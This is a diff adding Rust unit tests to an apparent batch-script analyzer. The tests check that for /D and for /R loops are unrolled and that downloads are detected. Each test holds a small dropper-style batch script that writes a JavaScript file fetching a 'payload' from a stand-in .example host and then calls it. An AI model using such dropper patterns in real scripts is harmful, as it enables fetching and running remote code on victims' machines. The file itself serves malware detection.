@@ -10845,6 +10845,98 @@ mod for_l_tests {
 }
 
 #[cfg(test)]
+mod for_directory_tests {
+    use crate::traits::Trait;
+    use crate::{analyze, Config};
+
+    #[test]
+    fn for_d_wildcard_over_tracked_directory_feeds_later_script_execution() {
+        let script = br#"mkdir C:\Temp\Stage
+echo fetch('https://for-d-dir.example/payload') > C:\Temp\Stage\run.js
+for /D %%D in (C:\Temp\*) do call %%D\run.js"#;
+        let report = analyze(script, &Config::default());
+        assert!(
+            report.deobfuscated.contains(r#"call c:\temp\stage\run.js"#),
+            "for /D did not unroll tracked directory path:\n{}",
+            report.deobfuscated
+        );
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::Download { src, .. } if src == "https://for-d-dir.example/payload"
+            )),
+            "for /D generated JS was not executed: {:?}\n{}",
+            report.traits,
+            report.deobfuscated
+        );
+    }
+
+    #[test]
+    fn for_r_wildcard_over_tracked_files_feeds_later_script_execution() {
+        let script = br#"echo fetch('https://for-r-file.example/payload') > C:\Work\Sub\run.js
+for /R C:\Work %%F in (*.js) do call %%F"#;
+        let report = analyze(script, &Config::default());
+        assert!(
+            report.deobfuscated.contains(r#"call c:\work\sub\run.js"#),
+            "for /R did not unroll tracked file path:\n{}",
+            report.deobfuscated
+        );
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::Download { src, .. } if src == "https://for-r-file.example/payload"
+            )),
+            "for /R generated JS was not executed: {:?}\n{}",
+            report.traits,
+            report.deobfuscated
+        );
+    }
+
+    #[test]
+    fn for_r_without_root_uses_tracked_files() {
+        let script = br#"echo fetch('https://for-r-noroot.example/payload') > run.js
+for /R %%F in (*.js) do call %%F"#;
+        let report = analyze(script, &Config::default());
+        assert!(
+            report.deobfuscated.contains("call run.js"),
+            "for /R without root did not unroll current-dir file:\n{}",
+            report.deobfuscated
+        );
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::Download { src, .. } if src == "https://for-r-noroot.example/payload"
+            )),
+            "for /R without root did not execute generated JS: {:?}\n{}",
+            report.traits,
+            report.deobfuscated
+        );
+    }
+
+    #[test]
+    fn for_r_quoted_root_with_space_uses_tracked_files() {
+        let script =
+            br#"echo fetch('https://for-r-quoted-root.example/payload') > "C:\Work Dir\run.js"
+for /R "C:\Work Dir" %%F in (*.js) do call "%%F""#;
+        let report = analyze(script, &Config::default());
+        assert!(
+            report.deobfuscated.contains(r#"call "c:\work dir\run.js""#),
+            "for /R quoted root did not unroll tracked file:\n{}",
+            report.deobfuscated
+        );
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::Download { src, .. } if src == "https://for-r-quoted-root.example/payload"
+            )),
+            "for /R quoted root did not execute generated JS: {:?}\n{}",
+            report.traits,
+            report.deobfuscated
+        );
+    }
+}
+
+#[cfg(test)]
 mod char_boundary_tests {
     use crate::traits::Trait;
     use crate::{analyze, Config};
